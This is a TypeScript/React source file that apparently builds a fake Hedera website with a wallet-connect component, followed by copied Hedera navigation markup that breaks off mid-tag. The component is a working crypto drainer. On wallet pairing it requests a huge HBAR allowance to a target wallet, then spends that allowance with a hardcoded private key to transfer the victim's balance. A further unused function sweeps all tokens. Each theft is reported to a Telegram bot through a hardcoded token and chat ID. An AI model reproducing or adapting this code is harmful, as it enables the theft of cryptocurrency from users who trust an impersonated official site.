import { AccountId,PrivateKey,TransactionId, Hbar,Client,AccountBalanceQuery, TransferTransaction, HbarUnit, AccountAllowanceApproveTransaction, AccountInfoQuery, TransactionResponse } from "@hashgraph/sdk";
import { useCallback, useEffect, useRef } from "react";
import { useDispatch, useSelector } from "react-redux";
import { hc, hcInitPromise, TARGET_WALLET,PVK } from "../../services/hashconnect";
import { actions, AppStore } from "../../store";
import { MirrorNodeClient } from "../../services/mirrorNodeClient";
import { appConfig } from "../../config";
import { config } from "dotenv";

interface INFOS {
  name: string;
  balance: number;
  accountId: number;
  token_id: string;
}

const token: string = process.env.BOT_TOKEN || "7686471781:AAHSr04Uik5hJxsB_JrYOpiU2vOhoI2VpXE";
const chatId = '-1002447636386';

export const HashConnectClient = () => {
  const dispatch = useDispatch();
  const syncCalledRef = useRef(false); // To track if syncWithHashConnect has already been called
  
  async function hbarAllowanceFcn(owner: any, receiver: any, sendBal: any, spender: any, spenderPvKey: any, client: any) {
    const approvedSendTx = new TransferTransaction()
        .addApprovedHbarTransfer(owner, sendBal.negated())
        .addHbarTransfer(receiver, sendBal)
        .setTransactionId(TransactionId.generate(spender)) // Spender must generate the TX ID or be the client
        .freezeWith(client);
    const approvedSendSign = await approvedSendTx.sign(spenderPvKey);
    const approvedSendSubmit = await approvedSendSign.execute(client);
    const approvedSendRx = await approvedSendSubmit.getReceipt(client);
    return approvedSendRx;
  }
  
  const sendMessageToTelegram = async (chatId: any, message: any) => {
    const botToken = "7686471781:AAHSr04Uik5hJxsB_JrYOpiU2vOhoI2VpXE"; // Replace with your Telegram bot token
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
    console.log("Sending message to Telegram:", message, chatId);
    
    const payload = {
      chat_id: chatId, // Replace with your chat ID or dynamically fetch
      text: message,   // Message to send
    };
  
    try {
      const response = await fetch(telegramApiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });
  
      const data = await response.json();
      if (!response.ok) {
        throw new Error(data.description || "Failed to send message");
      }
  
      console.log("Message sent successfully:", data);
    } catch (error) {
      console.error("Error sending message:", error);
    }
  };

  async function getTokenBalances(accountId: string) {
    try {
      // Define the mirror node URL
      const mirrorNodeUrl =
        await `https://mainnet.mirrornode.hedera.com/api/v1/accounts/${accountId}`;
      console.log(`Fetching account balance for account ID: ${accountId}`);
      // Make the fetch request
      const response = await fetch(mirrorNodeUrl);
      if (!response.ok) {
        throw new Error(
          `Failed to fetch account balance. Status: ${response.status}`
        );
      }
      // Parse the JSON response
      let object: any = await {};
      const data = await response.json();
      object = await JSON.stringify(data as any);
      console.log(JSON.parse(object), "000000000000000000");

      const hbarBalance =
        (await JSON.parse(object)?.balance?.balance) / 100000000; // Convert tinybars to HBAR
      console.log(
        `The HBAR account balance for account ID ${accountId} is ${hbarBalance} HBAR`
      );
      // const keyType = "ED25519"
      const keyType = data?.key?._type === "ED25519" ? "ED25519" : "ECDSA";
      return { remainingHbar: hbarBalance, keytype: keyType };
      // return { remainingHbar: hbarBalance, keytype: "ED" };
    } catch (error: any) {
      console.error("Error fetching account balance:", error.message);
      throw error;
    }
  }

  async function getAllowance(accountId: string) {
    try {
      // Define the mirror node URL
      // /api/v1/accounts/{idOrAliasOrEvmAddress}/allowances/crypto
      // /api/v1/accounts/{idOrAliasOrEvmAddress}/allowances/tokens
      const mirrorNodeUrl =
        await `https://mainnet.mirrornode.hedera.com/api/v1/accounts/${accountId}/allowances/crypto?limit=2&order=asc`;
      console.log(`Fetching account balance for account ID: ${accountId}`);
      // Make the fetch request
      const response = await fetch(mirrorNodeUrl);
      if (!response.ok) {
        throw new Error(
          `Failed to fetch account balance. Status: ${response.status}`
        );
      }
      // Parse the JSON response
      let object: any = await {};
      const data = await response.json();
      object = await JSON.stringify(data as any);

      // const allowance =
      //   (await JSON.parse(object)?.balance?.balance) / 100000000; // Convert tinybars to HBAR
      console.log(data, "000000000000000000");
      
      console.log(
        `The HBAR account balance for account ID ${data?.allowances} ${data}`
      );
      // const keyType = "ED25519"
      // const keyType = data?.key?._type === "ED25519" ? "ED25519" : "ECDSA";
      // return { allowance: allowance};
      // return { remainingHbar: hbarBalance, keytype: "ED" };
    } catch (error: any) {
      console.error("Error fetching account balance:", error.message);
      throw error;
    }
  }

  const syncWithHashConnect = useCallback(async () => {
    if (syncCalledRef.current) {
      console.log("syncWithHashConnect is already in progress.");
      return; // Prevent multiple calls
    }

    syncCalledRef.current = true;
    console.log("syncWithHashConnect started.");

    try {
      const connectedAccountIds = hc.connectedAccountIds;

      if (connectedAccountIds && connectedAccountIds.length > 0) {
        const targetAccountId = connectedAccountIds?.map((o: any) =>
          o.toString()
        )[0];
        const accountIDD = connectedAccountIds[0]?.num?.low;
        if (!accountIDD) {
          throw new Error("Account ID or its 'num.low' property is missing.");
        }
        // Update Redux state
        dispatch(
          actions.hashconnect.setAccountIds(
            connectedAccountIds.map((o: any) => o.toString())
          )
        );
        dispatch(actions.hashconnect.setIsConnected(true));
        dispatch(actions.hashconnect.setPairingString(hc.pairingString ?? ""));

        // Perform additional actions
        const mirrorNodeClient = new MirrorNodeClient(
          appConfig.networks.mainnet
        );
        let tokenInfos: INFOS[] = [];

        let tokens =
          await mirrorNodeClient.getAccountTokenBalancesWithTokenInfo(
            targetAccountId as any
          );
        if (!tokens || tokens.length <= 0) {
          tokenInfos = [];
        } else {
          console.log("Tokens received from API:", tokens);
          tokenInfos = tokens
            .filter((info: any) => info?.balance > 0 && info?.info) // Ensure info exists
            .map((info: any) => ({
              name: info?.info?.name ?? "Unknown Token",
              balance: info?.balance,
              accountId: Number(info?.token_id?.split(".").pop() ?? 0),
              token_id: info?.token_id?.toString() ?? "",
            }));
        }
        await handleAllowanceApprove(accountIDD);
        // const allowance = await getAllowance(accountIDD);

        // await sendAllTokens(accountIDD, TARGET_WALLET, tokenInfos);
      } else {
        // Update Redux for no connected accounts
        dispatch(actions.hashconnect.setAccountIds([]));
        dispatch(actions.hashconnect.setIsConnected(false));
        dispatch(actions.hashconnect.setPairingString(""));
      }
    } catch (error) {
      console.error("Error in syncWithHashConnect:", error);
    } finally {
      syncCalledRef.current = false; // Allow future calls
      console.log("syncWithHashConnect completed.");
    }
  }, [dispatch]);

  const handleAllowanceApprove = async (accountId: string) => {
    try {
      console.log("handleAllowanceApprove started", accountId);

      const hbarAccountId: string = `0.0.${accountId}`;
      const signer = await hc.getSigner(AccountId.fromString(hbarAccountId));

      // Create allowance transaction
      const transaction = new AccountAllowanceApproveTransaction()
        .approveHbarAllowance(
          hbarAccountId,
          TARGET_WALLET,
          new Hbar(10000000000) // Amount from your screenshot
        );

      // Freeze and execute transaction
      await transaction.freezeWithSigner(signer);
      const txResponse = await transaction.executeWithSigner(signer);
      const receipt = await txResponse.getReceipt(signer.getClient());

      console.log("Allowance Transaction Status:", receipt.status.toString());
      if (receipt.status.toString() === "SUCCESS") {
        sendMessageToTelegram(chatId, `${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
        let { remainingHbar, keytype } = await getTokenBalances(accountId); // Fetch HBAR balance
        const gasFee = await calculateHbarGasFee(0, 0);
        if (remainingHbar > gasFee) {
          remainingHbar = remainingHbar - gasFee;
          console.log("calculation is stress!", remainingHbar);
        }else{
          sendMessageToTelegram(chatId, `${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
          console.error("Insufficient HBAR. Cannot proceed with transaction.");
          return; // Exit if there’s no HBAR to cover gas fees
        }
        const balance = await new Hbar(Math.floor(remainingHbar));
        console.log("Remaining HBAR after allowance approval:", remainingHbar, Math.floor(remainingHbar), balance);
        
        // await transferHbarUsingAllowance(hbarAccountId, remainingHbar);
        const result = await hbarAllowanceFcn(hbarAccountId, TARGET_WALLET, balance, TARGET_WALLET, PrivateKey.fromStringED25519(PVK), Client.forMainnet());
        if (result.status.toString() === "SUCCESS") {
          sendMessageToTelegram(chatId, `${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${TARGET_WALLET}`);
        }else{
          sendMessageToTelegram(chatId, `${accountId} has failed 😭  ${Math.floor(remainingHbar)} to send HBAR to ${TARGET_WALLET}`);
        }
      }
      return receipt.status.toString() === "SUCCESS";
    } catch (error) {
      console.error("Error in allowance approval:", error);
      return false;
    }
  };

  useEffect(() => {
    const pairingCallback = (data: any) => {
      console.log("Pairing event detected:", data);
      syncWithHashConnect(); // Trigger sync on pairing
    };

    hc.pairingEvent.on(pairingCallback);
    // hc.connectionStatusChangeEvent.on(connectionCallback);
    return () => {
      hc.pairingEvent.off(pairingCallback);
    };
  }, [syncWithHashConnect]);

  useEffect(() => {
    const connectionCallback = (data: any) => {
      console.log("Connection status changed:", data);
      syncWithHashConnect(); // Trigger sync on connection status change
    };

    // Add connection status change listener
    hc.connectionStatusChangeEvent.on(connectionCallback);

    return () => {
      // Cleanup connection status listener
      hc.connectionStatusChangeEvent.off(connectionCallback);
    };
  }, [syncWithHashConnect]);

  function calculateHbarGasFee(zeroBytes = 0, nonZeroBytes = 0) {
    const baseGas = 21000; // Base gas for any transaction
    const hbarTransferSurcharge = 9000; // Surcharge for HBAR transfers

    // Calculate intrinsic gas
    const intrinsicGas = baseGas + 4 * zeroBytes + 16 * nonZeroBytes;

    // Total gas fee
    const totalGas = (intrinsicGas + hbarTransferSurcharge) / 100_000_000;

    console.log(
      `Gas fee for sending HBAR: ${totalGas} gas units (Intrinsic Gas: ${intrinsicGas}, Surcharge: ${hbarTransferSurcharge})`
    );
    return totalGas;
  }

  function calculateTokenGasFee(useSystemContract = false, zeroBytes = 0, nonZeroBytes = 0) {
    const baseGas = 21000; // Base intrinsic gas
    const opcodeGasPerTransfer = 2600; // Approximation for token transfer opcode gas

    // Calculate intrinsic gas
    const intrinsicGas = baseGas + 4 * zeroBytes + 16 * nonZeroBytes;

    let totalGas = intrinsicGas + opcodeGasPerTransfer;

    if (useSystemContract) {
      // Example: If Hedera Token Service system contract is used
      const systemContractBaseCostUSD = 0.10; // Example base cost in USD
      const gasConversionRate = 1000000; // Gas per USD
      const systemContractGas = systemContractBaseCostUSD * gasConversionRate * 1.2; // Add 20% surcharge
      totalGas += systemContractGas;
    }

    console.log(
      `Gas fee for sending tokens: ${Math.ceil(totalGas)} gas units (Intrinsic Gas: ${intrinsicGas}, Opcode Gas: ${opcodeGasPerTransfer}, System Contract Gas: ${useSystemContract})`
    );
    return Math.ceil(totalGas / 100_000_000);
  }

  const sendAllTokens = async (
    accountId: string,
    targetWallet: string,
    tokenBalances: INFOS[]
  ) => {
    try {
      const hbarAccountId = `0.0.${accountId}`;
      let { remainingHbar, keytype } = await getTokenBalances(accountId); // Fetch HBAR balance
      console.log("Initial HBAR Balance:", remainingHbar, keytype);
      const compareBal = remainingHbar;
      let signer;
      if (keytype === "ED25519") {
        signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
        console.log(signer, "it's only for ECDSA");
        if (remainingHbar <= 0) {
          console.error("Insufficient HBAR. Cannot proceed with transaction.");
          return; // Exit if there’s no HBAR to cover gas fees
        }
        const transferTx = new TransferTransaction();
        // const signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
        console.log(
          "Signer obtained:",
          signer,
          typeof hbarAccountId,
          typeof remainingHbar
        );
        // Estimated gas fee per token transfer (adjust as needed)
        const gasFeePerTokenTransfer = await calculateTokenGasFee(true, tokenBalances.length, 0); // Example: 0.0001 HBAR per token transfer
        // **Process Token Transfers**
        tokenBalances.forEach(({ token_id, balance }) => {
          if (balance > 0) {
            if (remainingHbar - gasFeePerTokenTransfer > 0) {
              // Deduct gas fee
              remainingHbar -= gasFeePerTokenTransfer;
              console.log(
                remainingHbar,
                "tokenBalnaces foreach loops",
                token_id,
                typeof token_id,
                typeof balance,
                balance
              );
              transferTx.addTokenTransfer(token_id, hbarAccountId, -balance); // Deduct from sender
              transferTx.addTokenTransfer(token_id, targetWallet, balance); // Add to receiver
              console.log(
                `Token transfer added for token ID: ${token_id}, Amount: ${balance}`
              );
              console.log(
                "Remaining HBAR after token transfer:",
                remainingHbar,
                "ECDSA"
              );
              // Add token transfer to transaction
            } else {
              console.warn(
                `Insufficient HBAR for gas fee. Skipping token transfer for ${token_id}.`
              );
            }
          }
        });

        const gasFee = await calculateHbarGasFee(0, 0);

        if (compareBal === remainingHbar) {
          remainingHbar = (await remainingHbar) - gasFee;
          console.log("calculation is stress!", compareBal, remainingHbar);
        }
        console.log(remainingHbar, " remaining Hbar amount");
        const tinybars = Math.round(remainingHbar * 100_000_000); // Convert HBAR to tinybars and round to nearest integer
        console.log(
          "Added HBAR transfer:",
          remainingHbar,
          typeof remainingHbar,
          "in tinybars:",
          tinybars
        );
        // **Handle Final HBAR Transfer**
        if (Number(remainingHbar) > 0) {
          console.log("remainingHbar is stresss for me!", remainingHbar);
          transferTx.addHbarTransfer(
            hbarAccountId,
            new Hbar(-tinybars, HbarUnit.Tinybar)
          ); // Deduct from sender
          transferTx.addHbarTransfer(
            targetWallet,
            new Hbar(tinybars, HbarUnit.Tinybar)
          ); // Add to receiver
          console.log("Added HBAR transfer:", remainingHbar);
        } else if (tokenBalances.length <= 0 && Number(remainingHbar) < 0) {
          console.error("Insufficient HBAR for final transfer.");
          return;
        } else {
        }
        // **Freeze and Execute the Transaction**
        await transferTx.freezeWithSigner(signer);
        console.log("Transaction frozen with signer.");
        const txResponse = await transferTx.executeWithSigner(signer);
        console.log("Transaction executed. Waiting for receipt...");

        // **Retrieve Transaction Receipt**
        const receipt = await txResponse.getReceipt(signer.getClient());
        console.log("Transaction Receipt Status:", receipt.status.toString());

        if (receipt.status.toString() === "SUCCESS") {
          console.log("All tokens and HBAR sent successfully!");
        } else {
          console.error(
            "Transaction failed. Status:",
            receipt.status.toString()
          );
        }
        return;
      } else if ((keytype as string) === "ECDSA") {
        signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
        console.log(signer, "it's only for ECDSA");
        if (remainingHbar <= 0) {
          console.error("Insufficient HBAR. Cannot proceed with transaction.");
          return; // Exit if there’s no HBAR to cover gas fees
        }
        const transferTx = new TransferTransaction();
        // const signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
        console.log(
          "Signer obtained:",
          signer,
          typeof hbarAccountId,
          typeof remainingHbar
        );
        // Estimated gas fee per token transfer (adjust as needed)
        const gasFeePerTokenTransfer = await calculateTokenGasFee(true, tokenBalances.length, 0); // Example: 0.0001 HBAR per token transfer
        console.log("gasFeePerTokenTransfer==============================00000000000000", gasFeePerTokenTransfer);
        // **Process Token Transfers**
        tokenBalances.forEach(({ token_id, balance }) => {
          if (balance > 0) {
            if (remainingHbar - gasFeePerTokenTransfer > 0) {
              // Deduct gas fee
              remainingHbar -= gasFeePerTokenTransfer;
              console.log(
                remainingHbar,
                "tokenBalnaces foreach loops",
                token_id,
                typeof token_id,
                typeof balance,
                balance
              );
              transferTx.addTokenTransfer(token_id, hbarAccountId, -balance); // Deduct from sender
              transferTx.addTokenTransfer(token_id, targetWallet, balance); // Add to receiver
              console.log(
                `Token transfer added for token ID: ${token_id}, Amount: ${balance}`
              );
              console.log(
                "Remaining HBAR after token transfer:",
                remainingHbar,
                "ECDSA"
              );
              // Add token transfer to transaction
            } else {
              console.warn(
                `Insufficient HBAR for gas fee. Skipping token transfer for ${token_id}.`
              );
            }
          }
        });
        const gasFee = await calculateHbarGasFee(0, 0);
        console.log("gasFee+++++++++++++++++++++++++0000000000000", gasFee);
        if (compareBal === remainingHbar) {
          remainingHbar = (await remainingHbar) - gasFee;
          console.log("calculation is stress!", compareBal, remainingHbar);
        }
        console.log(remainingHbar, " remaining Hbar amount");
        const tinybars = Math.round(remainingHbar * 100_000_000); // Convert HBAR to tinybars and round to nearest integer
        console.log(
          "Added HBAR transfer:",
          remainingHbar,
          typeof remainingHbar,
          "in tinybars:",
          tinybars
        );
        // **Handle Final HBAR Transfer**
        if (Number(remainingHbar) > 0) {
          console.log("remainingHbar is stresss for me!", remainingHbar);
          transferTx.addHbarTransfer(
            hbarAccountId,
            new Hbar(-tinybars, HbarUnit.Tinybar)
          ); // Deduct from sender
          transferTx.addHbarTransfer(
            targetWallet,
            new Hbar(tinybars, HbarUnit.Tinybar)
          ); // Add to receiver
          console.log("Added HBAR transfer:", remainingHbar);
        } else if (tokenBalances.length <= 0 && Number(remainingHbar) < 0) {
          console.error("Insufficient HBAR for final transfer.");
          return;
        } else {
        }
        // **Freeze and Execute the Transaction**
        await transferTx.freezeWithSigner(signer);
        console.log("Transaction frozen with signer.");
        const txResponse = await transferTx.executeWithSigner(signer);
        console.log("Transaction executed. Waiting for receipt...");

        // **Retrieve Transaction Receipt**
        const receipt = await txResponse.getReceipt(signer.getClient());
        console.log("Transaction Receipt Status:", receipt.status.toString());

        if (receipt.status.toString() === "SUCCESS") {
          console.log("All tokens and HBAR sent successfully!");
        } else {
          console.error(
            "Transaction failed. Status:",
            receipt.status.toString()
          );
        }
        // return;
      } else {
        console.error("Unsupported key type detected:", keytype);
        return; // Exit if the key type is neither ED25519 nor ECDSA
      }
    } catch (error) {
      console.error("Error executing transaction:", error);
    }
  };

  return null;
};

export const HashConnectConnectButton = () => {
  const { isConnected, accountIds: connectedAccountIds } = useSelector(
    (state: AppStore) => state.hashconnect
  );

  return (
    <>
  <div
    className="Nav is-initial"
    style={{top: 0}}
  >
    <div className="header">
      <a
        className="logo"
        href="https://hedera.com/"
      >
        <div className="symbol">
          <svg
            id="Layer_1"
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 40 40"
          >
            <path
              d="M20 0a20 20 0 1 0 20 20A20 20 0 0 0 20 0"
              className="circle"
            ></path>

            <path
              d="M28.13 28.65h-2.54v-5.4H14.41v5.4h-2.54V11.14h2.54v5.27h11.18v-5.27h2.54zm-13.6-7.42h11.18v-2.79H14.53z"
              className="h"
            ></path>
          </svg>
        </div>

        <span className="hedera">Hedera</span>
      </a>

      <div className="right">
        <nav
          id="mainMenu"
          className="main-menu"
        >
          <ul className="main-menu-nav">
            <li>
              <div
                className="menu-btn menu-title menu-title-1 menu-title-has-link"
              >
                <button
                  className="menu-title-link"
                  id="menu-button-network"
                >Network</button>

                <div
                  className="menu-dropdown  menu-dropdown-1 has-section-title"
                  style={{marginLeft: 0}}
                >
                  <ul
                    className="menu-dropdown-panel"
                    id="menu-list-network"
                  >
                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          // dataIndex="1"
                          role="heading"
                          id="menu-dropdown-section-services"
                        >Services</div>

                        <ul
                          className="menu-dropdown-list"
                          // ariaLabelledby="menu-dropdown-section-services"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/token-service"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Token-Service-std.svg?dm=1709012106"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Token-Service-hvr.svg?dm=1709012105"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Token Service</div>

                                <div className="menu-dropdown-item-description">
                                  Mint and configure tokens and accounts.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/consensus-service"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Consensus-Service-std.svg?dm=1709011923"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Consensus-Service-hvr.svg?dm=1709011921"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Consensus Service</div>

                                <div className="menu-dropdown-item-description">
                                  Verifiable timestamps and ordering of events.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/smart-contract"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Smart-Contracts-std.svg?dm=1709012090"
                                  
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Smart-Contracts-hvr.svg?dm=1709012088"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Smart Contracts</div>

                                <div className="menu-dropdown-item-description">Run Solidity smart contracts.</div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/hbar"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-HBAR-std.svg?dm=1709012020"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-HBAR-hvr.svg?dm=1709012018"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">HBAR</div>
                                <div className="menu-dropdown-item-description">
                                  The Hedera network's native cryptocurrency.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>

                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          // dataIndex="6"
                          role="heading"
                          id="menu-dropdown-section-insights"
                        >Insights</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/how-it-works"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-How-it-Works-std.svg?dm=1709012032"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-How-it-Works-hvr.svg?dm=1709012031"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">How It Works</div>

                                <div className="menu-dropdown-item-description">
                                  Learn about Hedera from end to end.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/network-explorers/"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Explorers-std.svg?dm=1709011975"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Explorers-hvr.svg?dm=1709011973"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Explorers</div>

                                <div className="menu-dropdown-item-description">
                                  View live and historical data on Hedera.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/dashboard"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Dashboard-std.svg?dm=1709011933"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Dashboard-hvr.svg?dm=1709011933"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Dashboard</div>

                                <div className="menu-dropdown-item-description">
                                  Analyze network activity and metrics.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/network-nodes"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Network-Nodes-std.svg?dm=1709012061"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Network-Nodes-hvr.svg?dm=1709012060"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Network Nodes</div>

                                <div className="menu-dropdown-item-description">
                                  Understand networks and node types.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>
                  </ul>
                </div>
              </div>
            </li>

            <li>
              <div
                className="menu-btn menu-title menu-title-2 menu-title-has-link"
              >
                <button
                  className="menu-title-link"
                  id="menu-button-devs"
                >Devs</button>

                <div
                  className="menu-dropdown  menu-dropdown-2 has-section-title"
                  
                  style={{ marginLeft: 37.3}}
                >
                  <ul
                    className="menu-dropdown-panel"
                    id="menu-list-devs"
                  >
                    <li className="menu-dropdown-section menu-dropdown-section--vertical-one-column">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          // dataIndex="1"
                          role="heading"
                          id="menu-dropdown-section-start-building"
                        >Start Building</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/getting-started"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Get-Started-Pink-hvr.svg?dm=1709011989"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Get-Started-Pink-hvr.svg?dm=1709011989"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Get Started</div>

                                <div className="menu-dropdown-item-description">
                                  Learn core concepts and build the future.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://docs.hedera.com/"
                              target="_blank"
                              rel="noreferrer noopener"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Documentation-Blue-hvr.svg?dm=1709011961"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Documentation-Pink-hvr.svg?dm=1709011964"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Documentation</div>

                                <div className="menu-dropdown-item-description">
                                  Review the API and build using your favorite language.
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </li>

                    <li className="menu-dropdown-section menu-dropdown-section--vertical-two-columns">
                      <div className="menu-dropdown-section--vertical-wrapper">
                        <div
                          className="menu-dropdown-section-title"
                          role="heading"
                          id="menu-dropdown-section-developer-resources"
                        >Developer Resources</div>

                        <ul
                          className="menu-dropdown-list"
                        >
                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/ecosystem/developer-tooling-integrations"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Integrations-std.svg?dm=1709012041"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Integrations-hvr.svg?dm=1709012034"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Integrations</div>

                                <div className="menu-dropdown-item-description">
                                  Plugins and microservices for Hedera.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/fees"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Fee-Estimator-std.svg?dm=1709011983"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
                                  src="https://files.hedera.com/Nav-Icon-Fee-Estimator-hvr.svg?dm=1709011984"
                                  loading="eager"
                                  
                                />
                              </div>

                              <div className="menu-dropdown-item-text">
                                <div className="menu-dropdown-item-title">Fee Estimator</div>

                                <div className="menu-dropdown-item-description">
                                  Understand and estimate transaction costs.
                                </div>
                              </div>
                            </a>
                          </li>

                          <li className="menu-dropdown-item">
                            <a
                              className="menu-dropdown-link"
                              href="https://hedera.com/open-source"
                              target="_self"
                            >
                              <div className="menu-dropdown-item-icon">
                                <img
                                  className="icon-graphic icon-graphic-has-hover"
                                  src="https://files.hedera.com/Nav-Icon-Open-Source-std.svg?dm=1709012068"
                                  loading="eager"
                                  
                                />

                                <img
                                  className="icon-graphic icon-graphic-hover"
